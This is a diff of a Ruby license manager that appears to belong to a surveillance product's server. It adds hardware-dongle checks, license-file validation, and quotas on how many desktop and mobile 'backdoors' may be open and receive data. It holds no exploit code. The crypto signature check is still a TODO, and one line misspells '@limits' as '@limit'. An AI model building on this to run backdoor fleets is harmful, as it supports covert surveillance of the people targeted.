@@ -2,6 +2,9 @@
 #  License handling stuff
 #
 
+# relative
+require_relative 'dongle.rb'
+
 # from RCS::Common
 require 'rcs-common/trace'
 
@@ -17,7 +20,7 @@ class LicenseManager
   include Singleton
   include RCS::Tracer
 
-  CONF_DIR = 'config'
+  LICENSE_VERSION = '8.0'
   LICENSE_FILE = 'rcs.lic'
 
   attr_reader :limits
@@ -49,24 +52,41 @@ class LicenseManager
   end
 
   def load_license
-    trace :info, "Loading license limits..."
+    trace :info, "Checking for hardware dongle..."
 
-    version = '8.0'
-
-    #TODO: check the serial of the dongle
-    serial = 123
-
+    begin
+      # get the version from the dongle (can rise exception)
+      serial = Dongle.serial
+    rescue Exception => e
+      trace :fatal, e.message
+      exit
+    end
+    
     # load the license file
-    lic_file = File.join Dir.pwd, CONF_DIR, LICENSE_FILE
+    lic_file = File.join Dir.pwd, Config::CONF_DIR, LICENSE_FILE
 
-    File.open(lic_file, "r") do |f|
-      lic = YAML.load(f.read)
-      # TODO: check the crypto signature
+    if File.exist? lic_file
+      trace :info, "Loading license limits #{lic_file}"
 
-      # load only licenses valid for the current dongle' serial and current version
-      if lic[:serial] == serial and lic[:version] == version
+      File.open(lic_file, "r") do |f|
+        lic = YAML.load(f.read)
+        # TODO: check the crypto signature
+
+        if lic[:serial] != serial
+          trace :fatal, 'Invalid License File: incorrect serial number'
+          exit
+        end
+
+        if lic[:version] != LICENSE_VERSION
+          trace :fatal, 'Invalid License File: incorrect version'
+          exit
+        end
+
+        # load only licenses valid for the current dongle's serial and current version
         add_limits lic
       end
+    else
+      trace :info, "No license file found, starting with default values..."
     end
 
     # sanity check
@@ -108,30 +128,55 @@ class LicenseManager
   end
 
   
-  def burn_one_license(type)
-    #TODO: burn a license forever
-    trace :info, "USING A LICENSE FOR:" + type
+  def burn_one_license(type, platform)
+
+    # check if the platform can be used
+    unless @limit[:backdoors][platform]
+      trace :warn, "You don't have a license for #{platform.to_s}. Queuing..."
+      return false
+    end
+
+    if @limits[:type] == 'reusable'
+      # reusable licenses don't consume any license slot but we have to check
+      # the number of already active backdoors in the db
+      desktop = Item.count(conditions: {_kind: 'backdoor', type: 'desktop', status: 'open'})
+      mobile = Item.count(conditions: {_kind: 'backdoor', type: 'mobile', status: 'open'})
+  
+      if desktop + mobile >= @limits[:backdoors][:total]
+        trace :warn, "You don't have enough total license to received data. Queuing..."
+        return false
+      end
+      if type == :desktop and desktop < @limits[:backdoors][:desktop]
+        return true
+      end
+      if type == :mobile and mobile < @limits[:backdoors][:mobile]
+        return true
+      end
+
+      trace :warn, "You don't have enough license for #{type.to_s}. Queuing..."
+      return false
+    end
+
+    if @limits[:type] == 'oneshot'
+
+      # do we have available license on the dongle?
+      if Dongle.count > 0
+        trace :info, "Using a permanent license: #{type.to_s} #{platform.to_s}"
+        Dongle.decrement
+        return true
+      else
+        trace :warn, "You don't have enough license to received data. Queuing..."
+        return false
+      end
+    end
+
+    return false
   end
 
-
-  def check(field, subfield=nil)
+  def check(field)
     case (field)
       when :users
         if ::User.count(conditions: {enabled: true}) < @limits[:users]
-          return true
-        end
-
-      when :backdoors
-        desktop = Item.count(conditions: {_kind: 'backdoor', type: 'desktop', status: 'open'})
-        mobile = Item.count(conditions: {_kind: 'backdoor', type: 'mobile', status: 'open'})
-
-        if desktop + mobile >= @limits[:backdoors][:total]
-          return false
-        end
-        if subfield == :desktop and desktop < @limits[:backdoors][:desktop]
-          return true
-        end
-        if subfield == :mobile and mobile < @limits[:backdoors][:mobile]
           return true
         end
 
@@ -162,6 +207,11 @@ class LicenseManager
 
 
   def periodic_check
+
+    # get the serial of the dongle.
+    # this will raise an exception if the dongle is not found
+    # we have to stop the process in this case
+    Dongle.serial
 
     # check the consistency of the database (if someone tries to tamper it)
 
